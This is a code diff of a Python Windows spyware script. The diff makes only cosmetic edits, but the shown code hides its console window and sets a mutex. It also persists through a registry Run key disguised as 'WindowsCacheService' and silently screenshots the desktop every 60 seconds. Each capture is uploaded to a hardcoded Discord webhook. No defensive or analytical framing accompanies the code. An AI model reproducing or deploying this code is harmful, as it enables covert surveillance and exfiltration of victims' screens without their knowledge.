@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 import os
 import sys
 import io
@@ -9,28 +10,30 @@ import urllib.request
 import urllib.error
 import subprocess
 import winreg
+
 try:
     console_hwnd = ctypes.windll.kernel32.GetConsoleWindow()
     if console_hwnd:
         ctypes.windll.user32.ShowWindow(console_hwnd, 0)
 except Exception:
     pass
+
 WEBHOOK_URL = "https://discord.com/api/webhooks/1468726823360663818/uoosMH5ytX_fET8w1XYfMTrBOqfyJd2YPF1GvZup_InXaoWeFp41TC-omJ6e1pa38QiT"
 INTERVAL = 60
 MUTEX_NAME = "Global\\WindowsCacheServiceMutex"
 STARTUP_REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 STARTUP_REG_NAME = "WindowsCacheService"
+
 try:
     mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
     if ctypes.windll.kernel32.GetLastError() == 183:
         sys.exit(0)
 except Exception:
     pass
+
 def ensure_persistence():
     try:
         script_path = os.path.abspath(sys.argv[0])
-        if not script_path.lower().endswith(('.pyw', '.py')):
-            script_path = os.path.abspath(sys.argv[0])
         python_dir = os.path.dirname(sys.executable)
         pythonw = os.path.join(python_dir, "pythonw.exe")
         if not os.path.exists(pythonw):
@@ -43,6 +46,7 @@ def ensure_persistence():
         return True
     except Exception:
         return False
+
 def take_screenshot():
     try:
         from PIL import ImageGrab
@@ -80,11 +84,9 @@ def take_screenshot():
         bmp_data += struct.pack("<I", image_size)
         bmp_data += struct.pack("<ii", 0, 0)
         bmp_data += struct.pack("<II", 0, 0)
-        buf_size = image_size
-        buf = ctypes.create_string_buffer(buf_size)
+        buf = ctypes.create_string_buffer(image_size)
         gdi32.GetDIBits(hdc_mem, hbmp, 0, height, buf,
-                        ctypes.byref(ctypes.create_string_buffer(dib_header_size + 40)),
-                        0)
+                        ctypes.byref(ctypes.create_string_buffer(dib_header_size + 40)), 0)
         bmp_data += buf.raw
         gdi32.DeleteObject(hbmp)
         gdi32.DeleteDC(hdc_mem)
@@ -92,6 +94,7 @@ def take_screenshot():
         return io.BytesIO(bmp_data)
     except Exception:
         return None
+
 def send_screenshot_to_discord(image_buffer):
     try:
         boundary = "----WebhookBoundary" + base64.b64encode(os.urandom(12)).decode()
@@ -112,6 +115,7 @@ def send_screenshot_to_discord(image_buffer):
             return resp.status == 200
     except Exception:
         return False
+
 def main_loop():
     ensure_persistence()
     while True:
@@ -122,6 +126,7 @@ def main_loop():
         except Exception:
             pass
         time.sleep(INTERVAL)
+
 if __name__ == "__main__":
     try:
         main_loop()
